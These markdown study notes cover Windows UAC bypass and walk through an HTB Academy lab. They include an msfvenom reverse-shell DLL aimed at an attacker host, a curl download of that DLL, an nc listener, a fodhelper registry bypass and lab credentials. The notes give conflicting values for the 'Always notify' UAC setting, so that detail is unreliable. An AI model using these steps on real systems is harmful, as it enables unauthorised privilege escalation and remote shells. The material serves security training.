# User Account Control (UAC) Bypass

## 🎯 Overview

**User Account Control (UAC)** provides consent prompts for elevated activities but is **not a security boundary**. With **Admin Approval Mode (AAM)**, admin users receive **two tokens** - standard and privileged. UAC bypasses exploit **auto-elevating binaries** and **DLL hijacking** to gain elevated privileges without prompts.

## 🔑 UAC Fundamentals

### Admin Approval Mode (AAM)
```cmd
# Standard user token (default context)
whoami /priv

# Limited privileges:
SeShutdownPrivilege           Disabled
SeChangeNotifyPrivilege       Enabled
SeUndockPrivilege             Disabled
```

### UAC Configuration Check
```cmd
# Check if UAC is enabled
REG QUERY HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Policies\System\ /v EnableLUA
# EnableLUA    REG_DWORD    0x1 (Enabled)

# Check UAC level
REG QUERY HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Policies\System\ /v ConsentPromptBehaviorAdmin
# 0x5 = Always notify (highest level)
# 0x2 = Prompt for consent for non-Windows binaries
# 0x0 = Elevate without prompting
```

## 🔧 DLL Hijacking Technique (UACME #54)

### Windows Build Assessment
```powershell
# Check Windows version
[environment]::OSVersion.Version

# Target: Windows 10 build 14393+ (Version 1607)
Major  Minor  Build  Revision
10     0      14393  0
```

### DLL Search Order Exploitation
```cmd
# Examine PATH variable
cmd /c echo %PATH%

# Key target: User-writable WindowsApps folder
C:\Users\sarah\AppData\Local\Microsoft\WindowsApps\
```

### Target Binary Analysis
```cmd
# SystemPropertiesAdvanced.exe (32-bit) auto-elevates
# Missing DLL: srrstr.dll (System Restore functionality)
# Search order: App directory → System32 → Windows → PATH
```

## 🚀 Exploitation Process

### 1. Generate Malicious DLL
```bash
# Create reverse shell DLL
msfvenom -p windows/shell_reverse_tcp LHOST=ATTACK_IP LPORT=8443 -f dll > srrstr.dll

# Host DLL via HTTP server
sudo python3 -m http.server 8080
```

### 2. Deploy DLL to Target
```powershell
# Download to user-writable PATH location
curl http://ATTACK_IP:8080/srrstr.dll -O "C:\Users\sarah\AppData\Local\Microsoft\WindowsApps\srrstr.dll"
```

### 3. Test Standard Execution
```cmd
# Test with rundll32 (standard privileges)
rundll32 shell32.dll,Control_RunDLL C:\Users\sarah\AppData\Local\Microsoft\WindowsApps\srrstr.dll

# Expected result: Normal user privileges
```

### 4. UAC Bypass Execution
```cmd
# Clean up rundll32 processes first
tasklist /svc | findstr "rundll32"
taskkill /PID [PID] /F

# Execute 32-bit SystemPropertiesAdvanced.exe
C:\Windows\SysWOW64\SystemPropertiesAdvanced.exe
```

## 🎯 HTB Academy Lab Solution

### Lab Environment
- **Credentials**: `sarah:HTB_@cademy_stdnt!`
- **Access Method**: RDP
- **User Context**: Local administrator with UAC enabled
- **Flag Location**: Desktop of sarah user

### Complete Walkthrough
```bash
# 1. Set up attack infrastructure
msfvenom -p windows/shell_reverse_tcp LHOST=10.10.14.3 LPORT=8443 -f dll > srrstr.dll
sudo python3 -m http.server 8080
nc -lvnp 8443

# 2. RDP to target and download DLL
curl http://10.10.14.3:8080/srrstr.dll -O "C:\Users\sarah\AppData\Local\Microsoft\WindowsApps\srrstr.dll"

# 3. Test standard execution (limited privileges)
rundll32 shell32.dll,Control_RunDLL C:\Users\sarah\AppData\Local\Microsoft\WindowsApps\srrstr.dll

# 4. Clean processes and execute UAC bypass
taskkill /PID [rundll32_PID] /F
C:\Windows\SysWOW64\SystemPropertiesAdvanced.exe

# 5. Verify elevated privileges in reverse shell
whoami /priv
# Should show extensive admin privileges:
# SeDebugPrivilege, SeBackupPrivilege, SeRestorePrivilege, etc.

# 6. Access flag
type C:\Users\sarah\Desktop\flag.txt
```

## 🔄 Alternative UAC Bypasses

### UACME Project Techniques
```cmd
# Popular techniques by Windows version:
- Technique #23: perfmon.exe + mmc.exe (Win 7-10)
- Technique #33: fodhelper.exe (Win 10)
- Technique #43: computerdefaults.exe (Win 10)
- Technique #54: SystemPropertiesAdvanced.exe (Win 10 14393+)
```

### Registry-Based Bypasses
```cmd
# fodhelper.exe bypass (Technique #33)
REG ADD HKCU\Software\Classes\ms-settings\Shell\Open\command /d "cmd.exe" /f
REG ADD HKCU\Software\Classes\ms-settings\Shell\Open\command /v DelegateExecute /t REG_SZ /f
fodhelper.exe
```

## ⚠️ Detection & Defense

### Detection Indicators
```cmd
# Monitor for:
- Unusual DLL loads from user-writable paths
- Auto-elevating binary executions
- Registry modifications in HKCU\Software\Classes
- Process creation with elevation without UAC prompt
```

### Defensive Measures
```cmd
# Security configurations:
- Set UAC to "Always notify" (ConsentPromptBehaviorAdmin = 0x2)
- Monitor auto-elevating binaries
- Implement Application Control policies
- Restrict user PATH modifications
```

## 💡 Key Takeaways

1. **UAC is not a security boundary** - convenience feature only
2. **Admin Approval Mode** creates dual-token scenario
3. **Auto-elevating binaries** can be exploited via DLL hijacking
4. **PATH manipulation** enables user-controlled DLL loading
5. **Multiple bypass techniques** exist for different Windows versions

---

*UAC bypasses exploit design flaws in auto-elevating mechanisms, enabling privilege escalation without user consent prompts.* 